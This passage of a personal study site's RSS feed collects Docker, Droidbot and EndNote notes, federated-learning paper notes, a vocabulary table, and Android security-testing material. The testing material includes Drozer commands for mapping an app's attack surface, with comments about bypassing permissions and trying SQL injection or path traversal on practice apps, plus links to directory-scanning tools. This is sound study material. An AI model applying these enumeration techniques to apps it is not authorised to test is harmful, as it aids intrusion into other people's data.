&lt;li>&lt;a href="https://github.com/pmiaowu/PmWebDirScan">PmWebDirScan&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/corunb/Dirscan">Dirscan&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.csdn.net/qq_38612882/article/details/122648462">Dirb&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/maurosoria/dirsearch.git">Dirsearch&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/ffuf/ffuf">Ffuf&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docker Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/others/docker-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/docker-cheat-sheet/</guid><description>&lt;h1 id="docker-cheat-sheet">
 Docker Cheat Sheet
 &lt;a class="anchor" href="#docker-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-docker%e5%9f%ba%e7%a4%8e%e6%95%99%e5%ad%b8-7bbe3a351caf">Docker筆記 - Docker基礎教學&lt;/a>
&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-%e9%80%b2%e5%85%a5container-%e5%bb%ba%e7%ab%8b%e4%b8%a6%e6%93%8d%e4%bd%9c-postgresql-container-d221ba39aaec">Docker筆記 - 進入Container，建立並操作 PostgreSQL Container&lt;/a>
&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-%e6%9b%b4%e6%94%b9container%e7%9a%84configuration-5dc69d28a421">Docker筆記 - 更改Container的Configuration&lt;/a>
&lt;a href="https://medium.com/alberthg-docker-notes/docker%e7%ad%86%e8%a8%98-%e8%ae%93%e8%b3%87%e6%96%99%e9%81%a0%e9%9b%a2container-%e4%bd%bf%e7%94%a8-volume-bind-mount-%e8%88%87-tmpfs-mount-6908da341d11">Docker筆記 - 讓資料遠離Container，使用 Volume、Bind Mount 與 Tmpfs Mount&lt;/a>
&lt;a href="https://matthung0807.blogspot.com/2020/12/docker-docker-compose-dockerfile-difference.html">Docker Docker Compose與Dockerfile差別 &lt;/a>
&lt;a href="https://osslab.tw/books/docker/page/docker-compose-%E6%8C%87%E4%BB%A4">Docker Compose 指令&lt;/a>&lt;/p>
&lt;h2 id="command">
 Command
 &lt;a class="anchor" href="#command">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.ibm.com/docs/en/workload-automation/9.5.0?topic=compose-accessing-docker-containers">Know docker container name&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ docker ps
# Then you&amp;#39;ll find the container name at the end of the result
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://matthung0807.blogspot.com/2020/10/docker-go-into-container-bash-shell.html">Go into container bash shell&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ docker exec -it &amp;lt;container_name&amp;gt; bash

# 以root的身份進入container
# 極度建議以此方法進入bash
$ docker exec -u root -it &amp;lt;container_id&amp;gt; /bin/bash
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Check Log
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose logs
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>啟動所有的 Docker Container 指令如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>停止 docker-compose 執行的所有 Container
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose stop
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>刪除 docker-compose 的所有 Container
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker-compose rm
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Leave Container
&lt;code>exit or ctrl-D&lt;/code>&lt;/li>
&lt;li>利用Dockerfile build一個Images並且實際跑起來
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker run -it --rm &lt;span style="color:#66d9ef">$(&lt;/span>docker build -q .&lt;span style="color:#66d9ef">)&lt;/span> /bin/sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>:::spoiler 實作&lt;/p></description></item><item><title>Droidbot</title><link>https://bernie6401.github.io/docs/tools/others/android-app-crawler/droidbot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-app-crawler/droidbot/</guid><description>&lt;h1 id="droidbot">
 Droidbot
 &lt;a class="anchor" href="#droidbot">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://github.com/honeynet/droidbot">Official Github Repo&lt;/a>其實也說明得非常清楚，但在初次執行的時候可能會出現以下問題，按照&lt;a href="https://juejin.cn/post/7316582773434204171"> APP自動化全站爬取探索 &lt;/a>，只要修改&lt;code>./droidbot/app.py&lt;/code>的line 28就可以了
:::spoiler Execution Problem&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ droidbot -a ./base.apk/Mattermost.apk -grant_perm -script ./my_pass_login_script.json -keep_app
INFO:Device:disable minicap on sdk &amp;gt;= 32
Traceback (most recent call last):
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 96, in __init__
 self.app = App(app_path, output_dir=self.output_dir)
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\app.py&amp;#34;, line 28, in __init__
 from androguard.core.bytecodes.apk import APK
ModuleNotFoundError: No module named &amp;#39;androguard.core.bytecodes&amp;#39;
[CONNECTION] ADB is disconnected
WARNING:DroidBotIme:Failed to disconnect DroidBotIME!
Traceback (most recent call last):
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 96, in __init__
 self.app = App(app_path, output_dir=self.output_dir)
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\app.py&amp;#34;, line 28, in __init__
 from androguard.core.bytecodes.apk import APK
ModuleNotFoundError: No module named &amp;#39;androguard.core.bytecodes&amp;#39;

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
 File &amp;#34;\\?\C:\Users\berni\anaconda3\envs\mitmproxy\Scripts\droidbot-script.py&amp;#34;, line 33, in &amp;lt;module&amp;gt;
 sys.exit(load_entry_point(&amp;#39;droidbot&amp;#39;, &amp;#39;console_scripts&amp;#39;, &amp;#39;droidbot&amp;#39;)())
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\start.py&amp;#34;, line 145, in main
 droidbot = DroidBot(
 ^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 116, in __init__
 self.stop()
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 191, in stop
 if hasattr(self.input_manager.policy, &amp;#34;master&amp;#34;) and \
 ^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: &amp;#39;NoneType&amp;#39; object has no attribute &amp;#39;policy&amp;#39;
&lt;/code>&lt;/pre>&lt;p>:::
&lt;img src="https://hackmd.io/_uploads/HJwvucL2A.png" alt="image" />&lt;/p></description></item><item><title>Drozer Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/drozer-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/drozer-cheat-sheet/</guid><description>&lt;h1 id="drozer-cheat-sheet">
 Drozer Cheat Sheet
 &lt;a class="anchor" href="#drozer-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="basic-console">
 Basic Console
 &lt;a class="anchor" href="#basic-console">#&lt;/a>
&lt;/h2>
&lt;p>基本上最常用的command就是&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run &amp;lt;drozer module&amp;gt; &amp;lt;optional object&amp;gt; # 啟動內建的module做到依稀操作
dz&amp;gt; help &amp;lt;drozer module&amp;gt; # 查看該module的說明以及參數設定
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.package.list #列出所有已安裝的app package
dz&amp;gt; run app.package.list -f &amp;lt;key word&amp;gt; #列出特定的app package 
dz&amp;gt; run app.package.info -a &amp;lt;app package name&amp;gt; # 列出該app的基本訊息
dz&amp;gt; run app.package.manifest &amp;lt;app package name e.g. jakhar.aseem.diva&amp;gt; # 查看AndroidManifest.xml的資訊
dz&amp;gt; run app.package.attacksurface &amp;lt;app package name e.g. com.mwr.example.sieve&amp;gt; # 查看該app有什麼攻擊面
Attack Surface:
 3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限
 0 broadcast receivers exported
 2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal
 2 services exported
 is debuggable
&lt;/code>&lt;/pre>&lt;p>接著根據得到的資訊看要用以下哪一種的攻擊模式&lt;/p></description></item><item><title>Drozer/MobSF Installation</title><link>https://bernie6401.github.io/docs/tools/others/android-related/installation/drozer_mobsf-installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/installation/drozer_mobsf-installation/</guid><description>&lt;h1 id="drozermobsf-installation">
 Drozer/MobSF Installation
 &lt;a class="anchor" href="#drozermobsf-installation">#&lt;/a>
&lt;/h1>
&lt;h2 id="installation---drozer">
 Installation - Drozer
 &lt;a class="anchor" href="#installation---drozer">#&lt;/a>
&lt;/h2>
&lt;p>我是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>的說明，但其實參考官網的也可以，我是用docker裝&lt;/p>
&lt;ol>
&lt;li>Download drozer-agent &amp;amp; Install - &lt;a href="https://github.com/WithSecureLabs/drozer-agent/releases">Download&lt;/a>
這是要安裝在手機測試端的類似一個server的概念，而我們的電腦端也要安裝類似的東西(有好幾種方式，我是用Docker)，讓電腦和手機可以互通
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb install drozer-agent.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Start a Session
打開agent app會發現右下角有一個Off，點擊後會變成On，代表這個agent已經準備好要和電腦這邊的server連接
![Screenshot_20240603-131808](&lt;a href="https://hackmd.io/_uploads/SkPEfC9NC.png">https://hackmd.io/_uploads/SkPEfC9NC.png&lt;/a> =200x)&lt;/li>
&lt;li>設定電腦的Port轉發到Android的某個Port
根據&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>的說明，以及官網的要求，我們必須要把電腦31415這個port的封包轉發到手機端的31415這個port
&lt;blockquote>
&lt;p>Android 的 adb forward 通訊埠轉發的功能，adb forward 的功能是轉發 PC 電腦上某個埠號 (port) 資料到 Android 裝置的某個埠號 (port)，例如：下列 adb forward 指令就是將 PC 端的 port 10000 收到的資料，轉發給到 Android Device 的 port 20000&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb forward tcp:31415 tcp:31415
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Install PC Drozer Client
看到以下畫面就代表成功了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker run -it --add-host host.docker.internal:host-gateway withsecurelabs/drozer console connect --server host.docker.internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Selecting ff762fc058e91df3 &lt;span style="color:#f92672">(&lt;/span>Google Pixel 6a 13&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .. ..:.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..o.. .r..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..a.. . ....... . ..nd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ro..idsnemesisand..pr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .otectorandroidsneme.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .,sisandprotectorandroids+.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..nemesisandprotectorandroidsn:.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .emesisandprotectorandroidsnemes..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..isandp,..,rotecyayandro,..,idsnem.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .isisandp..rotectorandroid..snemisis.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ,andprotectorandroidsnemisisandprotec.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .torandroidsnemesisandprotectorandroid.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .snemisisandprotectorandroidsnemesisan:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .dprotectorandroidsnemesisandprotector.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drozer Console &lt;span style="color:#f92672">(&lt;/span>v3.0.2&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="installation---mobsf">
 Installation - MobSF
 &lt;a class="anchor" href="#installation---mobsf">#&lt;/a>
&lt;/h2>
&lt;p>可以直接使用&lt;a href="https://mobsf.live/">線上的工具&lt;/a>，也可以用docker架在自己的電腦&lt;/p></description></item><item><title>EIFFeL: Ensuring Integrity For Federated Learning - Notes</title><link>https://bernie6401.github.io/docs/survey-papers/federated-learning/eiffel_-ensuring-integrity-for-federated-learning---notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/federated-learning/eiffel_-ensuring-integrity-for-federated-learning---notes/</guid><description>&lt;h1 id="eiffel-ensuring-integrity-for-federated-learning---notes">
 EIFFeL: Ensuring Integrity For Federated Learning - Notes
 &lt;a class="anchor" href="#eiffel-ensuring-integrity-for-federated-learning---notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Roy Chowdhury, A., Guo, C., Jha, S., &amp;amp; van der Maaten, L. (2022, November). Eiffel: Ensuring integrity for federated learning. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (pp. 2535-2549).
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://medium.com/%E6%A9%9F%E5%99%A8%E5%AD%B8%E7%BF%92%E7%9F%A5%E8%AD%98%E6%AD%B7%E7%A8%8B/%E8%81%AF%E9%82%A6%E5%AD%B8%E7%BF%92%E7%9A%84%E7%B0%A1%E5%96%AE%E4%BB%8B%E7%B4%B9-776924277d13">聯邦學習的簡單介紹&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>聯邦學習的流程大致上可以分成4步驟：&lt;/p>
&lt;ul>
&lt;li>確定架構(拓樸) Formulate topology&lt;/li>
&lt;li>梯度計算 Gradient compute&lt;/li>
&lt;li>資訊交換 Information exchange&lt;/li>
&lt;li>模型聚合 model aggregation&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/83786131">What is Secure Aggregation?&lt;/a>&lt;/p></description></item><item><title>Endnote - Invalid Citation</title><link>https://bernie6401.github.io/docs/problem-solutions/endnote---invalid-citation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/endnote---invalid-citation/</guid><description>&lt;h1 id="endnote---invalid-citation">
 Endnote - Invalid Citation
 &lt;a class="anchor" href="#endnote---invalid-citation">#&lt;/a>
&lt;/h1>
&lt;p>目前遇到的怪問題，先紀錄起來，之後再解決&lt;/p>
&lt;h2 id="problem">
 Problem
 &lt;a class="anchor" href="#problem">#&lt;/a>
&lt;/h2>
&lt;p>使用Endnote寫論文，因不明原因導致關閉Word之後，出現某一些references不見了，而且經過一些測試，不見的論文都是同樣幾篇，&lt;/p>
&lt;h2 id="已嘗試的方法">
 已嘗試的方法
 &lt;a class="anchor" href="#%e5%b7%b2%e5%98%97%e8%a9%a6%e7%9a%84%e6%96%b9%e6%b3%95">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>重新remove該reference後，再cite一次，但只要關閉word，重開後就還是回復原樣&lt;/li>
&lt;li>刪除endnote的data file，並且建立新的library，再從雲端拉資料下來，再重複方法1，還是無果&lt;/li>
&lt;li>複製一份新的paper template(原本的這一篇也是用這個template改的)，再重新把資料從舊的word，一段一段搬運過去，並且同步cite各個reference，但還是一樣，重新開啟Word後，在同樣的幾篇論文出現Invalid Citation&lt;/li>
&lt;li>在Endnote中去除有問題的幾篇論文，再重新下載Google Scholar的Endnote Files，然後再用一樣的方法cite，結果還是一樣&lt;/li>
&lt;li>如果用一篇完全空白的word，並且用Endnote cite那幾篇有問題的論文，會發現沒有出現任何問題&lt;/li>
&lt;/ol>
&lt;h2 id="確定的事情">
 確定的事情
 &lt;a class="anchor" href="#%e7%a2%ba%e5%ae%9a%e7%9a%84%e4%ba%8b%e6%83%85">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>雲端的資料應該沒有問題&lt;/li>
&lt;li>出現問題的應該是Word，但不確定是哪邊&lt;/li>
&lt;/ol>
&lt;p>目前可能的解決方式是直接開一個新的Word，然後一段一段搬運過去，就不要用Template改&lt;/p>
&lt;h2 id="更新">
 更新
 &lt;a class="anchor" href="#%e6%9b%b4%e6%96%b0">#&lt;/a>
&lt;/h2>
&lt;p>我大概知道原因了，基本上應該是Endnote無法處理&amp;quot;範圍&amp;quot;，也就是類似[10-13]這樣的關係，雖然不知道為什麼，但其實只要把範圍拆開獨立顯示-&amp;gt;[10][11][12][13]就沒問題了，不過之後還是要查一下為什麼會這樣&lt;/p></description></item><item><title>English Writing Vocabulary</title><link>https://bernie6401.github.io/docs/knowledge/english-writing-vocabulary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/knowledge/english-writing-vocabulary/</guid><description>&lt;h1 id="english-writing-vocabulary">
 English Writing Vocabulary
 &lt;a class="anchor" href="#english-writing-vocabulary">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-english-writing">
 tags: &lt;code>English Writing&lt;/code>
 &lt;a class="anchor" href="#tags-english-writing">#&lt;/a>
&lt;/h6>
&lt;h2 id="verbs">
 Verbs
 &lt;a class="anchor" href="#verbs">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Normal&lt;/th>
 &lt;th style="text-align: center">Replaced by&lt;/th>
 &lt;th>Comment or Example&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">Assert&lt;/td>
 &lt;td style="text-align: center">Say&lt;/td>
 &lt;td>The author asserts that the issue is lacking a simple solution.&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Advantageous&lt;/td>
 &lt;td style="text-align: center">good&lt;/td>
 &lt;td>The author’s most salient solution is her most advantageous, as one can reason that it would effectively solve the problem.&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">concurrency&lt;/td>
 &lt;td style="text-align: center">at the same time&lt;/td>
 &lt;td>N/A&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Employ&lt;/td>
 &lt;td style="text-align: center">use&lt;/td>
 &lt;td>The author employs rhetorical questions in order to assert her beliefs in a more persuasive manner.&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Use&lt;/td>
 &lt;td style="text-align: center">Utilize&lt;/td>
 &lt;td>兩者不完全一樣，refer to &lt;a href="https://www.facebook.com/ParrotTalks/posts/1151875948345113/">this page&lt;/a>，utilize是帶點&lt;strong>主要用途以外&lt;/strong>的使用方式&lt;/br>You can use my chopsticks to eat noodles.&lt;/br>You can utilize chopsticks to keep your hair in a bun.&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">be associated with sth&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>The cancer risks associated with smoking have been well documented&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="conjunction">
 Conjunction
 &lt;a class="anchor" href="#conjunction">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Normal&lt;/th>
 &lt;th style="text-align: center">Replaced by&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">Firstly&lt;/td>
 &lt;td style="text-align: center">To begin with&amp;hellip;&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Secondly&lt;/td>
 &lt;td style="text-align: center">In addition&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Thirdly&lt;/td>
 &lt;td style="text-align: center">Furthermore&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Lastly&lt;/td>
 &lt;td style="text-align: center">In conclusion&amp;hellip;&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Also&lt;/td>
 &lt;td style="text-align: center">Moreover&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Anyway&lt;/td>
 &lt;td style="text-align: center">Nevertheless&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">I think&lt;/td>
 &lt;td style="text-align: center">In my opinion&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">So&lt;/td>
 &lt;td style="text-align: center">Therefore&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">And&lt;/td>
 &lt;td style="text-align: center">In addition&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">But&lt;/td>
 &lt;td style="text-align: center">However&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="oral">
 Oral
 &lt;a class="anchor" href="#oral">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Normal&lt;/th>
 &lt;th style="text-align: center">Replaced by&lt;/th>
 &lt;th>Comment or Example&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">Me too&lt;/td>
 &lt;td style="text-align: center">Welcome to the club&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Me too&lt;/td>
 &lt;td style="text-align: center">Ditto&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Me too&lt;/td>
 &lt;td style="text-align: center">Same Here&lt;/td>
 &lt;td>Nice to meet you. Same here&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="adjective">
 Adjective
 &lt;a class="anchor" href="#adjective">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Normal&lt;/th>
 &lt;th style="text-align: center">Replaced by&lt;/th>
 &lt;th>Comment or Example&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">Very Importatnt&lt;/td>
 &lt;td style="text-align: center">Significant&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very Easy&lt;/td>
 &lt;td style="text-align: center">Effortless&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very Crowded&lt;/td>
 &lt;td style="text-align: center">Bustling&lt;/td>
 &lt;td>Wow, a bustling metropolitan newsroom.&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very quick&lt;/td>
 &lt;td style="text-align: center">Rapid&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very funny&lt;/td>
 &lt;td style="text-align: center">Hilarious&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very happy&lt;/td>
 &lt;td style="text-align: center">Ecstatic&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very busy&lt;/td>
 &lt;td style="text-align: center">Swamped&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very rich&lt;/td>
 &lt;td style="text-align: center">Wealthy&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very upset&lt;/td>
 &lt;td style="text-align: center">distraught&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very cold&lt;/td>
 &lt;td style="text-align: center">Freezing&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very colorful&lt;/td>
 &lt;td style="text-align: center">vibrant&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very bad&lt;/td>
 &lt;td style="text-align: center">awful&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very smart&lt;/td>
 &lt;td style="text-align: center">Intelligent&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">Very sad&lt;/td>
 &lt;td style="text-align: center">sorrowful&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
